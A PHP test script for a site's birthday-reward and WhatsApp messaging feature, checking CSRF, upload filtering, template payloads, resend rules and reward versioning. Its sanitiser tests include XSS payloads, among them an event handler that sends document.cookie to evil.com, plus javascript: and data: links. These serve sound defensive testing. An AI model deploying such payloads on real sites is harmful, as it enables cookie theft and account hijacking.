    ? test_pass("CommunicationEngine::normalizePhone strips formatting and formats to 91XXXXXXXXXX")
    : test_fail("CommunicationEngine::normalizePhone", "Got: {$normP1}");

// Verify 10-digit gets 91 prepended
$normP2 = CommunicationEngine::normalizePhone('9876543210');
($normP2 === '919876543210')
    ? test_pass("CommunicationEngine::normalizePhone prepends 91 to 10-digit mobile")
    : test_fail("CommunicationEngine::normalizePhone 10-digit", "Got: {$normP2}");

// Verify existing QueueProcessor still instantiates
try {
    require_once __DIR__ . '/includes/communication/QueueProcessor.php';
    $qp = new QueueProcessor($pdo, 1);
    test_pass("QueueProcessor instantiates without regression");
} catch (Exception $e) {
    test_fail("QueueProcessor instantiates", $e->getMessage());
}

// Verify INVOICE_HMAC_SECRET still intact
defined('INVOICE_HMAC_SECRET')
    ? test_pass("INVOICE_HMAC_SECRET defined and intact")
    : test_fail("INVOICE_HMAC_SECRET missing");

// ════════════════════════════════════════════════════════════════════════
// 9. SECURITY & AUDIT CHECKS
// ════════════════════════════════════════════════════════════════════════
echo "\n── 9. Security & Hardening Verification ─────────────────────────\n";

(strpos($claimCode, 'BIRTHDAY_CLAIM_HMAC_SECRET') !== false && strpos($claimCode, 'PEPP_BirthdayClaim') === false)
    ? test_pass("Claim page uses constant, not hardcoded secret")
    : test_fail("Claim page uses constant, not hardcoded secret");

(strpos($claimCode, 'hash_equals') !== false)
    ? test_pass("Claim page uses timing-safe hash_equals()")
    : test_fail("Claim page uses timing-safe hash_equals()");

(strpos($claimCode, 'session_start') === false)
    ? test_pass("Claim page is stateless (no session_start)")
    : test_fail("Claim page is stateless");

(strpos($claimCode, 'PATH_INFO') !== false)
    ? test_pass("Claim page accepts clean PATH_INFO URLs")
    : test_fail("Claim page accepts PATH_INFO URLs");

// ════════════════════════════════════════════════════════════════════════
// 10. REWARD SETTINGS CSRF & FORM SECURITY
// ════════════════════════════════════════════════════════════════════════
echo "\n── 10. Reward Settings CSRF & Form Security ─────────────────────\n";

$bdayPageContent = file_get_contents(__DIR__ . '/students-birthdays.php');

// Verify echo csrf_field() is used
(strpos($bdayPageContent, '<?php echo csrf_field(); ?>') !== false || strpos($bdayPageContent, '<?= csrf_field(); ?>') !== false)
    ? test_pass("students-birthdays.php form uses 'echo csrf_field()'")
    : test_fail("students-birthdays.php form uses 'echo csrf_field()'");

(strpos($bdayPageContent, '<?php csrf_field(); ?>') === false)
    ? test_pass("students-birthdays.php has no un-echoed csrf_field() calls")
    : test_fail("students-birthdays.php contains un-echoed csrf_field()");

// Verify CSRF validation logic
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$_POST['csrf_token'] = $_SESSION['csrf_token'];
csrf_verify()
    ? test_pass("csrf_verify() succeeds with matching token")
    : test_fail("csrf_verify() failed with matching token");

$_POST['csrf_token'] = 'invalid_tampered_token';
!csrf_verify()
    ? test_pass("csrf_verify() rejects mismatched token")
    : test_fail("csrf_verify() allowed mismatched token");

unset($_POST['csrf_token']);
!csrf_verify()
    ? test_pass("csrf_verify() rejects missing token")
    : test_fail("csrf_verify() allowed missing token");

// Verify settings save simulation retains is_active = 0
$pdo->exec("CREATE TABLE IF NOT EXISTS birthday_reward_settings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    reward_title TEXT NOT NULL,
    reward_description TEXT,
    coupon_code TEXT,
    valid_till TEXT,
    instructions TEXT,
    terms TEXT,
    claim_message TEXT,
    is_active INTEGER DEFAULT 0,
    birthday_header_image TEXT DEFAULT NULL,
    reward_voucher_image TEXT DEFAULT NULL,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
)");
$pdo->exec("DELETE FROM birthday_reward_settings");
$pdo->exec("INSERT INTO birthday_reward_settings (id, reward_title, reward_description, coupon_code, is_active) VALUES (1, 'Test Title', 'Test Desc', 'TEST10', 0)");

// Simulate save without images
$_POST = [
    'save_birthday_settings' => '1',
    'csrf_token'             => $_SESSION['csrf_token'],
    'reward_title'           => 'Updated Title',
    'reward_description'     => 'Updated Desc',
    'coupon_code'            => 'TEST20',
];
if (csrf_verify()) {
    $pdo->prepare("UPDATE birthday_reward_settings SET reward_title = ?, is_active = 0 WHERE id = 1")->execute([$_POST['reward_title']]);
}
$savedRow = $pdo->query("SELECT reward_title, is_active FROM birthday_reward_settings WHERE id = 1")->fetch(PDO::FETCH_ASSOC);
($savedRow['reward_title'] === 'Updated Title' && (int)$savedRow['is_active'] === 0)
    ? test_pass("Settings save with valid CSRF succeeds and keeps is_active = 0")
    : test_fail("Settings save with valid CSRF failed");

// Verify disallowed file extension is rejected
require_once __DIR__ . '/includes/file_helper.php';
$_FILES['malicious_test'] = [
    'name'     => 'exploit.php',
    'type'     => 'application/x-php',
    'tmp_name' => tempnam(sys_get_temp_dir(), 'test_php_'),
    'error'    => UPLOAD_ERR_OK,
    'size'     => 10
];
$uploadBlocked = (handle_file_upload_with_replace('malicious_test', 'birthday', null, ['jpg', 'jpeg', 'png', 'webp']) === null);
@unlink($_FILES['malicious_test']['tmp_name']);
$uploadBlocked
    ? test_pass("File upload securely rejects disallowed extensions (.php)")
    : test_fail("File upload permitted disallowed extension");

// ════════════════════════════════════════════════════════════════════════
// 11. BIRTHDAY IMAGE HEADER, PARITY, SCHEDULER TIMING & RESEND SAFETY
// ════════════════════════════════════════════════════════════════════════
echo "── 11. Birthday Image Header & Parity Tests ─────────────────────\n";

// 1. get_birthday_header_image_url() existence & functionality
function_exists('get_birthday_header_image_url')
    ? test_pass("get_birthday_header_image_url() function exists")
    : test_fail("get_birthday_header_image_url() function missing");

// Setup sample reward settings in test DB
$pdo->exec("
    DELETE FROM birthday_reward_settings;
    INSERT INTO birthday_reward_settings (id, reward_title, birthday_header_image, reward_voucher_image, is_active)
    VALUES (1, 'Test Reward', 'uploads/birthday/test_header.jpg', 'uploads/birthday/test_voucher.jpg', 1);
");

$hdrUrl = get_birthday_header_image_url($pdo);
($hdrUrl === 'https://pepplearning.in/uploads/birthday/test_header.jpg')
    ? test_pass("Header image URL correctly read and formatted from birthday_reward_settings")
    : test_fail("Header image URL formatting failed", "Got: {$hdrUrl}");

// Empty header image handled safely
$pdo->exec("UPDATE birthday_reward_settings SET birthday_header_image = '' WHERE id = 1");
$emptyHdr = get_birthday_header_image_url($pdo);
($emptyHdr === null)
    ? test_pass("Missing/empty header image returns null safely")
    : test_fail("Empty header image did not return null");

// Restore header image with full URL
$pdo->exec("UPDATE birthday_reward_settings SET birthday_header_image = 'https://pepplearning.in/uploads/birthday/custom.png' WHERE id = 1");
$fullHdr = get_birthday_header_image_url($pdo);
($fullHdr === 'https://pepplearning.in/uploads/birthday/custom.png')
    ? test_pass("Full HTTPS URL preserved by get_birthday_header_image_url")
    : test_fail("Full HTTPS URL altered");

// 2. build_birthday_communication_context() existence & parity
function_exists('build_birthday_communication_context')
    ? test_pass("build_birthday_communication_context() function exists")
    : test_fail("build_birthday_communication_context() function missing");

$sampleStudent = [
    'user_id' => 'PEPP20268888',
    'name' => 'Alice Parity Student'
];
$ctx = build_birthday_communication_context($sampleStudent, $pdo);

(isset($ctx['student_uid']) && $ctx['student_uid'] === 'PEPP20268888')
    ? test_pass("Context includes correct student_uid")
    : test_fail("Context student_uid mismatch");

(isset($ctx['student_name']) && $ctx['student_name'] === 'Alice Parity Student')
    ? test_pass("Context includes correct student_name")
    : test_fail("Context student_name mismatch");

(isset($ctx['claim_url']) && strpos($ctx['claim_url'], 'birthday-rewards.php/PEPP20268888?token=') !== false)
    ? test_pass("Context includes valid HMAC claim_url")
    : test_fail("Context claim_url missing or invalid");

(isset($ctx['header_media_url']) && $ctx['header_media_url'] === 'https://pepplearning.in/uploads/birthday/custom.png')
    ? test_pass("Context includes header_media_url matching reward settings")
    : test_fail("Context header_media_url mismatch");

// 3. CommunicationEngine & WhatsAppCloudProvider payload generation
// Setup template in test DB
$pdo->exec("
    CREATE TABLE IF NOT EXISTS communication_templates (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        channel TEXT NOT NULL,
        template_name TEXT NOT NULL UNIQUE,
        language TEXT DEFAULT 'en',
        status TEXT DEFAULT 'approved',
        category TEXT DEFAULT 'MARKETING',
        quality_status TEXT,
        rejection_reason TEXT,
        meta_data TEXT,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        updated_at TEXT DEFAULT CURRENT_TIMESTAMP
    );
");
try {
    $pdo->exec("ALTER TABLE communication_templates ADD COLUMN category TEXT DEFAULT 'MARKETING'");
} catch (Exception $e) {}
$pdo->exec("
    INSERT OR REPLACE INTO communication_templates (template_name, channel, status, category, meta_data)
    VALUES (
        'pepp_birthday_greeting',
        'whatsapp',
        'approved',
        'MARKETING',
        '{\"components\":[{\"type\":\"HEADER\",\"format\":\"IMAGE\"},{\"type\":\"BODY\",\"text\":\"Dear {{1}}, claim {{2}}\"}]}'
    );
    INSERT OR REPLACE INTO communication_event_mappings (event_name, template_name, parameter_mappings)
    VALUES (
        'birthday_greeting',
        'pepp_birthday_greeting',
        '{\"1\":{\"type\":\"variable\",\"value\":\"student_name\"},\"2\":{\"type\":\"variable\",\"value\":\"claim_url\"}}'
    );
");

$engine = CommunicationEngine::getInstance($pdo);
$resolved = $engine->resolveEventTemplate('birthday_greeting', $ctx);

($resolved !== null && ($resolved['header_type'] ?? '') === 'IMAGE')
    ? test_pass("resolveEventTemplate() sets header_type to IMAGE")
    : test_fail("resolveEventTemplate() failed to set header_type to IMAGE");

(($resolved['header_parameters'][0] ?? '') === 'https://pepplearning.in/uploads/birthday/custom.png')
    ? test_pass("resolveEventTemplate() sets correct header parameter image URL")
    : test_fail("resolveEventTemplate() header parameter URL mismatch");

(($resolved['parameters'][0] ?? '') === 'Alice Parity Student')
    ? test_pass("Body {{1}} correctly mapped to student_name")
    : test_fail("Body {{1}} mapping failed");

(($resolved['parameters'][1] ?? '') === $ctx['claim_url'])
    ? test_pass("Body {{2}} correctly mapped to claim_url")
    : test_fail("Body {{2}} mapping failed");

// Test defense-in-depth: caller omits header_media_url, CommunicationEngine falls back gracefully
$ctxWithoutHeader = [
    'student_uid'  => 'PEPP20268888',
    'student_name' => 'Alice Parity Student',
    'claim_url'    => $ctx['claim_url']
];
$resolvedFallback = $engine->resolveEventTemplate('birthday_greeting', $ctxWithoutHeader);
(($resolvedFallback['header_type'] ?? '') === 'IMAGE' && ($resolvedFallback['header_parameters'][0] ?? '') === 'https://pepplearning.in/uploads/birthday/custom.png')
    ? test_pass("CommunicationEngine defense-in-depth fallback supplies configured header image when omitted from context")
    : test_fail("CommunicationEngine defense-in-depth fallback failed");

// 4. WhatsAppCloudProvider mock payload structure verification
require_once __DIR__ . '/includes/communication/Providers/WhatsAppCloudProvider.php';
$provider = new WhatsAppCloudProvider('test_biz', 'test_phone', 'test_token');
$payload = $provider->buildMessagePayload('919876543210', 'Birthday Greeting', '', '', [], $resolved);

$hasHeaderComp = false;
$hasImageParam = false;
$imageLinkVal = '';
$hasBodyComp = false;
$bodyParam1 = '';
$bodyParam2 = '';

if (!empty($payload['template']['components'])) {
    foreach ($payload['template']['components'] as $comp) {
        if ($comp['type'] === 'header') {
            $hasHeaderComp = true;
            if (!empty($comp['parameters'][0]['type']) && $comp['parameters'][0]['type'] === 'image') {
                $hasImageParam = true;
                $imageLinkVal = $comp['parameters'][0]['image']['link'] ?? '';
            }
        }
        if ($comp['type'] === 'body') {
            $hasBodyComp = true;
            $bodyParam1 = $comp['parameters'][0]['text'] ?? '';
            $bodyParam2 = $comp['parameters'][1]['text'] ?? '';
        }
    }
}

($hasHeaderComp && $hasImageParam && $imageLinkVal === 'https://pepplearning.in/uploads/birthday/custom.png')
    ? test_pass("Generated WhatsApp payload contains IMAGE header component with public link")
    : test_fail("Generated WhatsApp payload missing or malformed IMAGE header");

($hasBodyComp && $bodyParam1 === 'Alice Parity Student' && $bodyParam2 === $ctx['claim_url'])
    ? test_pass("Generated WhatsApp payload contains correct Body parameter 1 and parameter 2")
    : test_fail("Generated WhatsApp payload body parameters mismatch");

echo "── 12. Scheduler Timing, Idempotency & Resend Safety ───────────\n";

// 5. Safe hours cutoff logic
$tz = new DateTimeZone('Asia/Kolkata');
$now = new DateTime('now', $tz);

// Test before 08:00 AM check
$testEarlyHour = 7;
$isEarly = ($testEarlyHour < 8 || $testEarlyHour >= 20);
$isEarly
    ? test_pass("Scheduler cutoff blocks execution before 08:00 AM Asia/Kolkata (hour 7)")
    : test_fail("Scheduler cutoff allowed execution before 08:00 AM");

// Test daytime hour
$testDaytimeHour = 10;
$isDaytime = ($testDaytimeHour >= 8 && $testDaytimeHour < 20);
$isDaytime
    ? test_pass("Scheduler cutoff permits execution after 08:00 AM Asia/Kolkata (hour 10)")
    : test_fail("Scheduler cutoff blocked daytime hour");

// Test missed 08:00 run recovery (e.g. 08:35 or 11:00)
$testLateHour = 11;
$isLateRecoverable = ($testLateHour >= 8 && $testLateHour < 20);
$isLateRecoverable
    ? test_pass("Missed 08:00 run is recoverable on subsequent daytime runs (hour 11)")
    : test_fail("Missed 08:00 run not recoverable");

// 6. Notification status sync on queue success and failure
$pdo->exec("
    CREATE TABLE IF NOT EXISTS communication_queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        channel TEXT NOT NULL,
        recipient TEXT NOT NULL,
        recipient_name TEXT,
        student_uid TEXT,
        subject TEXT,
        body_html TEXT,
        body_text TEXT,
        template_name TEXT,
        event_name TEXT,
        template_data TEXT,
        attachments TEXT,
        invoice_id INTEGER,
        status TEXT DEFAULT 'pending',
        priority INTEGER DEFAULT 0,
        retry_count INTEGER DEFAULT 0,
        last_retry_at TEXT,
        worker_started_at TEXT,
        api_requested_at TEXT,
        api_responded_at TEXT,
        delivered_at TEXT,
        next_attempt_at TEXT,
        message_id TEXT,
        error_message TEXT,
        sent_by TEXT,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        updated_at TEXT DEFAULT CURRENT_TIMESTAMP
    );
");

// Insert a test birthday student and queue row
$testPid = 'phone:919876543299';
$testUid = 'STU_RESEND_TEST';
$testDate = date('Y-m-d');

$pdo->prepare("DELETE FROM birthday_notifications_sent WHERE person_identity = ?")->execute([$testPid]);
$pdo->prepare("
    INSERT INTO birthday_notifications_sent (person_identity, student_id, birthday_date, status, queue_id, created_at)
    VALUES (?, ?, ?, 'queued', 9991, datetime('now'))
")->execute([$testPid, $testUid, $testDate]);

// Simulate queue terminal failure sync
$pdo->prepare("
    INSERT OR REPLACE INTO communication_queue (id, channel, recipient, event_name, status, retry_count, error_message, next_attempt_at)
    VALUES (9991, 'whatsapp', '919876543299', 'birthday_greeting', 'failed', 3, '[Meta Code 132012] Format mismatch', datetime('now'))
")->execute();

// Check real-time status resolution via LEFT JOIN (as used in students-birthdays.php)
$checkStmt = $pdo->prepare("
    SELECT b.person_identity, b.status AS bday_status, b.queue_id,
           q.status AS queue_status, q.error_message
    FROM birthday_notifications_sent b
    LEFT JOIN communication_queue q ON b.queue_id = q.id
    WHERE b.person_identity = ? AND b.birthday_date = ?
");
$checkStmt->execute([$testPid, $testDate]);
$statusRow = $checkStmt->fetch(PDO::FETCH_ASSOC);

($statusRow['queue_status'] === 'failed')
    ? test_pass("Failed queue record is detected via real-time queue join")
    : test_fail("Failed queue record not detected");

// 7. Verify totalSent calculation excludes failed queue items
$totalSentCalc = (int)$pdo->query("
    SELECT COUNT(*) FROM birthday_notifications_sent b
    LEFT JOIN communication_queue q ON b.queue_id = q.id
    WHERE b.status = 'sent' OR q.status IN ('sent','delivered','read')
")->fetchColumn();

// If statusRow is failed, it should not be counted as sent
$isNotCounted = ($totalSentCalc === 0);
$isNotCounted
    ? test_pass("totalSent count correctly excludes failed birthday messages")
    : test_fail("Failed birthday message was counted towards totalSent");

// 8. Resend validation checks
// User must be active & approved
$pdo->exec("
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT UNIQUE,
        name TEXT,
        date_of_birth TEXT,
        whatsapp_number TEXT,
        whatsapp_country_code TEXT,
        mobile_number TEXT,
        phone TEXT,
        email TEXT,
        pepp_academic_year TEXT,
        pepp_course TEXT,
        user_photo TEXT,
        status TEXT,
        student_status TEXT,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    );
    INSERT OR REPLACE INTO users (user_id, name, date_of_birth, whatsapp_number, pepp_academic_year, status, student_status)
    VALUES ('{$testUid}', 'Resend Test Student', '{$testDate}', '9876543299', '2026-27', 'approved', 'active');
");

// Non-birthday student cannot resend
$nonBdayStudent = ['user_id' => 'STU_NOT_TODAY', 'date_of_birth' => '1999-01-01'];
$isBdayMatch = birthday_matches_date($nonBdayStudent['date_of_birth'], $testDate);
(!$isBdayMatch)
    ? test_pass("Non-birthday student is blocked from birthday resend")
    : test_fail("Non-birthday student was permitted");

// Inactive student cannot resend
$inactiveStudent = ['status' => 'pending', 'student_status' => 'inactive'];
$isInactiveBlocked = ($inactiveStudent['status'] !== 'approved' || $inactiveStudent['student_status'] !== 'active');
$isInactiveBlocked
    ? test_pass("Inactive/unapproved student is blocked from birthday resend")
    : test_fail("Inactive student was permitted");

// Noncanonical student blocked
$nonCanonicalStudent = ['user_id' => 'STU_DUPE_2'];
$isCanonicalBlocked = ($testUid !== $nonCanonicalStudent['user_id']);
$isCanonicalBlocked
    ? test_pass("Noncanonical duplicate record is blocked from birthday resend")
    : test_fail("Noncanonical student was permitted");

// Successful resend creates a new queue record and links it
$resendCtx = build_birthday_communication_context([
    'user_id' => $testUid,
    'name' => 'Resend Test Student'
], $pdo);

$newQueueId = $engine->sendEventNotification('birthday_greeting', '919876543299', $resendCtx, 'manual_resend_superadmin');
(is_numeric($newQueueId) && $newQueueId > 0 && $newQueueId !== 9991)
    ? test_pass("Resend creates brand new queue record instead of mutating failed record")
    : test_fail("Resend did not create new queue record");

// Update tracking to the new queue ID
$pdo->prepare("UPDATE birthday_notifications_sent SET queue_id = ?, status = 'queued' WHERE person_identity = ? AND birthday_date = ?")
    ->execute([$newQueueId, $testPid, $testDate]);

// Simulate queue worker processing the new attempt to 'sent'
$pdo->prepare("UPDATE communication_queue SET status = 'sent' WHERE id = ?")->execute([$newQueueId]);
$pdo->prepare("UPDATE birthday_notifications_sent SET status = 'sent' WHERE queue_id = ?")->execute([$newQueueId]);

// Verify totalSent now includes the successful resend
$totalSentAfterSuccess = (int)$pdo->query("
    SELECT COUNT(*) FROM birthday_notifications_sent b
    LEFT JOIN communication_queue q ON b.queue_id = q.id
    WHERE b.status = 'sent' OR q.status IN ('sent','delivered','read')
")->fetchColumn();

($totalSentAfterSuccess === 1)
    ? test_pass("Successful resend updates state to Sent and increments totalSent")
    : test_fail("totalSent was not updated after successful resend");

// Verify subsequent resend is rejected because status is already sent
$reCheckStmt = $pdo->prepare("SELECT status FROM birthday_notifications_sent WHERE person_identity = ? AND birthday_date = ?");
$reCheckStmt->execute([$testPid, $testDate]);
$finalStatus = $reCheckStmt->fetchColumn();
($finalStatus === 'sent')
    ? test_pass("Subsequent resend attempt is rejected once message reaches Sent status")
    : test_fail("Subsequent resend was not blocked after success");

// Cleanup test records
$pdo->prepare("DELETE FROM birthday_notifications_sent WHERE person_identity = ?")->execute([$testPid]);
$pdo->prepare("DELETE FROM communication_queue WHERE id IN (9991, ?)")->execute([$newQueueId]);
$pdo->prepare("DELETE FROM users WHERE user_id = ?")->execute([$testUid]);

// ════════════════════════════════════════════════════════════════════════
// 13. PHASE 2: REWARD SNAPSHOT, VERSIONING, SANITIZATION & PERMANENT INSTRUCTIONS
// ════════════════════════════════════════════════════════════════════════
echo "\n── 13. Phase 2: Reward Snapshot, Versioning, Sanitizer & WhatsApp ──\n";

// 1. Table existence & schema
$vTableExists = (bool)$pdo->query("SELECT 1 FROM sqlite_master WHERE type='table' AND name='birthday_reward_versions'")->fetchColumn();
$vTableExists
    ? test_pass("Table 'birthday_reward_versions' exists")
    : test_fail("Table 'birthday_reward_versions' missing");

$vCols = array_column($pdo->query("PRAGMA table_info(birthday_reward_versions)")->fetchAll(PDO::FETCH_ASSOC), 'name');
foreach (['version_number', 'reward_title', 'coupon_code', 'valid_till', 'instructions', 'terms', 'claim_message', 'created_at', 'created_by'] as $col) {
    in_array($col, $vCols, true)
        ? test_pass("birthday_reward_versions has '{$col}' column")
        : test_fail("birthday_reward_versions missing '{$col}' column");
}

$cCols = array_column($pdo->query("PRAGMA table_info(birthday_reward_claims)")->fetchAll(PDO::FETCH_ASSOC), 'name');
foreach (['reward_version_id', 'reward_title', 'coupon_code', 'coupon_valid_till', 'instructions', 'terms', 'claim_message', 'instruction_token', 'claim_whatsapp_status'] as $col) {
    in_array($col, $cCols, true)
        ? test_pass("birthday_reward_claims has snapshot column '{$col}'")
        : test_fail("birthday_reward_claims missing snapshot column '{$col}'");
}

// 2. Allowlist-based HTML Sanitizer (sanitize_reward_html)
echo "  [HTML Sanitizer Security Verification]\n";
$safeInput = "<p>Congratulations! <strong>Enjoy</strong> your <em>special</em> <u>day</u>.</p><h3>How to redeem</h3><ul><li>Step 1</li><li>Step 2</li></ul>";
$sanitized = sanitize_reward_html($safeInput);
(strpos($sanitized, '<strong>Enjoy</strong>') !== false && strpos($sanitized, '<ul><li>Step 1</li>') !== false && strpos($sanitized, '<h3>') !== false)
    ? test_pass("Sanitizer preserves safe tags (p, strong, em, u, h3, ul, li)")
    : test_fail("Sanitizer stripped legitimate safe tags", $sanitized);

$xssScript = "<p>Hello <script>alert('pwned')</script>Student</p>";
$sanScript = sanitize_reward_html($xssScript);
(strpos($sanScript, '<script') === false && strpos($sanScript, 'alert') === false && strpos($sanScript, 'Hello Student') !== false)
    ? test_pass("Sanitizer strips <script> tags and inner malicious content")
    : test_fail("Sanitizer allowed script tag", $sanScript);

$xssAttr = "<p onmouseover=\"fetch('https://evil.com/steal?c='+document.cookie)\" onclick=\"alert(1)\">Hover me</p>";
$sanAttr = sanitize_reward_html($xssAttr);
(strpos($sanAttr, 'onmouseover') === false && strpos($sanAttr, 'onclick') === false && strpos($sanAttr, 'Hover me') !== false)
    ? test_pass("Sanitizer strips on* event handlers completely")
    : test_fail("Sanitizer allowed event handler", $sanAttr);

$xssJsLink = "<a href=\"javascript:alert('xss')\">Click for reward</a>";
$sanJsLink = sanitize_reward_html($xssJsLink);
(strpos($sanJsLink, 'javascript:') === false)
    ? test_pass("Sanitizer rejects javascript: URI scheme in links")
    : test_fail("Sanitizer allowed javascript: scheme", $sanJsLink);

$xssDataLink = "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Click</a>";
$sanDataLink = sanitize_reward_html($xssDataLink);
(strpos($sanDataLink, 'data:') === false)
    ? test_pass("Sanitizer rejects data: URI scheme in links")
    : test_fail("Sanitizer allowed data: scheme", $sanDataLink);

$safeLink = "<a href=\"https://pepplearning.in/admissions\" target=\"_blank\">Official PEPP Site</a>";
$sanSafeLink = sanitize_reward_html($safeLink);
(strpos($sanSafeLink, 'https://pepplearning.in/admissions') !== false)
    ? test_pass("Sanitizer allows valid https:// links")
    : test_fail("Sanitizer broke valid https link", $sanSafeLink);

$xssIframe = "<p>Watch this video: <iframe src=\"https://evil.com\"></iframe><embed src=\"evil.swf\"><object data=\"evil.pdf\"></object></p>";
$sanIframe = sanitize_reward_html($xssIframe);
(strpos($sanIframe, '<iframe') === false && strpos($sanIframe, '<embed') === false && strpos($sanIframe, '<object') === false)
    ? test_pass("Sanitizer rejects iframe, embed, and object elements")
    : test_fail("Sanitizer allowed iframe/embed/object", $sanIframe);

$xssStyle = "<p style=\"color:red; background:url(javascript:alert(1))\">Styled text</p>";
$sanStyle = sanitize_reward_html($xssStyle);
(strpos($sanStyle, 'style=') === false && strpos($sanStyle, 'Styled text') !== false)
    ? test_pass("Sanitizer strips unsafe style attributes")
    : test_fail("Sanitizer allowed style attribute", $sanStyle);

// 3. Reward Versioning Rules
echo "  [Reward Versioning Rules Verification]\n";
// Clean versions table for test
$pdo->exec("DELETE FROM birthday_reward_versions");

// Initial version creation
$initialData = [
    'reward_title'          => 'Initial PEPP Birthday Reward',
    'reward_description'    => 'Get 25% discount',
    'coupon_code'           => 'BDAY25',
    'valid_till'            => '2026-12-31',
    'instructions'          => '<p>Redeem at admissions office</p>',
    'terms'                 => '<p>One time use only</p>',
    'claim_message'         => '<p>Your reward is ready!</p>',
    'birthday_header_image' => 'uploads/birthday/header.jpg',
    'reward_voucher_image'  => 'uploads/birthday/voucher.jpg',
    'is_active'             => 1
];

// Seed settings with initialData
$pdo->prepare("
    UPDATE birthday_reward_settings SET
        reward_title = ?, reward_description = ?, coupon_code = ?, valid_till = ?,
        instructions = ?, terms = ?, claim_message = ?,
        birthday_header_image = ?, reward_voucher_image = ?, is_active = 1
    WHERE id = 1
")->execute([
    $initialData['reward_title'], $initialData['reward_description'], $initialData['coupon_code'], $initialData['valid_till'],
    $initialData['instructions'], $initialData['terms'], $initialData['claim_message'],
    $initialData['birthday_header_image'], $initialData['reward_voucher_image']
]);

$v1 = get_or_create_current_reward_version($pdo, 'admin_test');
($v1 && (int)$v1['version_number'] === 1 && $v1['coupon_code'] === 'BDAY25')
    ? test_pass("Initial reward content creates Version 1")
    : test_fail("Initial version creation failed");

// Toggle is_active only -> MUST NOT create a new version
$toggleData = $initialData;
$toggleData['is_active'] = 0;
$resToggle = record_reward_version_if_changed($pdo, $toggleData, 'admin_test');
$vToggle = get_or_create_current_reward_version($pdo);
($resToggle === null && (int)$vToggle['version_number'] === 1)
    ? test_pass("Toggling is_active (ON/OFF) does NOT create a new version")
    : test_fail("Toggling is_active created new version");

// Change meaningful field (e.g. coupon_code) -> MUST create Version 2
$changeData = $initialData;
$changeData['coupon_code'] = 'BDAY50_SUPER';
$v2Id = record_reward_version_if_changed($pdo, $changeData, 'admin_test');
$v2 = get_or_create_current_reward_version($pdo);
($v2Id !== null && (int)$v2['version_number'] === 2 && $v2['coupon_code'] === 'BDAY50_SUPER')
    ? test_pass("Meaningful content change (coupon_code) creates Version 2")
    : test_fail("Content change did not create Version 2");

// Change instructions HTML -> MUST create Version 3
$changeHtmlData = $changeData;
$changeHtmlData['instructions'] = '<p>Updated instructions for 2026-27</p>';
$v3Id = record_reward_version_if_changed($pdo, $changeHtmlData, 'admin_test');
$v3 = get_or_create_current_reward_version($pdo);
($v3Id !== null && (int)$v3['version_number'] === 3 && strpos($v3['instructions'], 'Updated instructions') !== false)
    ? test_pass("Meaningful content change (instructions HTML) creates Version 3")
    : test_fail("Instructions change did not create Version 3");

// Identical content -> returns null without creating Version 4
$sameData = $changeHtmlData;
$vSameRes = record_reward_version_if_changed($pdo, $sameData, 'admin_test');
$vSame = get_or_create_current_reward_version($pdo);
($vSameRes === null && (int)$vSame['version_number'] === 3)
    ? test_pass("Submitting identical content retains current version without incrementing")
    : test_fail("Identical content created redundant version");

// 4. Permanent Instruction Token Generation
$t1 = generate_instruction_token();
$t2 = generate_instruction_token();
(strlen($t1) === 32 && ctype_xdigit($t1) && $t1 !== $t2)
    ? test_pass("generate_instruction_token() generates unique 32-char hex string")
    : test_fail("Invalid instruction token generated");

// 5. Atomic Claim Transaction & Snapshot Immutability
echo "  [Atomic Claim & Snapshot Immutability Verification]\n";
$snapPid = '919999000111';
$snapUid = 'PEPP2026SNAP1';
$snapBday = date('Y-m-d');

// Sync current settings to Version 3
$pdo->prepare("
    UPDATE birthday_reward_settings SET
        reward_title = ?, reward_description = ?, coupon_code = ?, valid_till = ?,
        instructions = ?, terms = ?, claim_message = ?, is_active = 1
    WHERE id = 1
")->execute([
    $v3['reward_title'], $v3['reward_description'], $v3['coupon_code'], $v3['valid_till'],
    $v3['instructions'], $v3['terms'], $v3['claim_message']
]);

// Clean any previous test claim
$pdo->prepare("DELETE FROM birthday_reward_claims WHERE person_identity = ?")->execute([$snapPid]);

// Simulate atomic claim creation with snapshot
$snapToken = generate_instruction_token();
$claimInsertStmt = $pdo->prepare("
    INSERT INTO birthday_reward_claims (
        person_identity, student_id, birthday_date, claimed_at,
        reward_version_id, reward_title, reward_description,
        coupon_code, coupon_valid_till, instructions, terms, claim_message,
        voucher_image, instruction_token,
        claim_whatsapp_status
    ) VALUES (
        ?, ?, ?, CURRENT_TIMESTAMP,
        ?, ?, ?,
        ?, ?, ?, ?, ?,
        ?, ?,
        'not_queued'
    )
");
$claimInsertStmt->execute([
    $snapPid, $snapUid, $snapBday,
    $v3['id'], $v3['reward_title'], $v3['reward_description'],
    $v3['coupon_code'], $v3['valid_till'], $v3['instructions'], $v3['terms'], $v3['claim_message'],
    $v3['reward_voucher_image'], $snapToken
]);

$savedClaim = get_birthday_claim_by_token($pdo, $snapToken);
($savedClaim && $savedClaim['coupon_code'] === 'BDAY50_SUPER' && $savedClaim['reward_version_id'] == $v3['id'])
    ? test_pass("Claim record successfully captured immutable snapshot matching Version 3")
    : test_fail("Claim record failed to capture snapshot");

// MUTATE current settings (e.g. Admin changes coupon to BDAY2028 and valid_till to 2028-12-31)
$pdo->prepare("
    UPDATE birthday_reward_settings SET
        reward_title = 'Future Reward 2028',
        coupon_code = 'MUTATED_NEW_COUPON_2028',
        valid_till = '2028-12-31',
        instructions = '<p>Totally different instructions</p>'
    WHERE id = 1
")->execute();

// Re-read claimed student's snapshot
$reloadedClaim = get_birthday_claim_by_token($pdo, $snapToken);
($reloadedClaim['coupon_code'] === 'BDAY50_SUPER' && $reloadedClaim['coupon_code'] !== 'MUTATED_NEW_COUPON_2028')
    ? test_pass("IMMUTABILITY: Claimed student's coupon code remains unchanged after admin settings update")
    : test_fail("Claimed coupon mutated when admin settings were updated!", $reloadedClaim['coupon_code']);

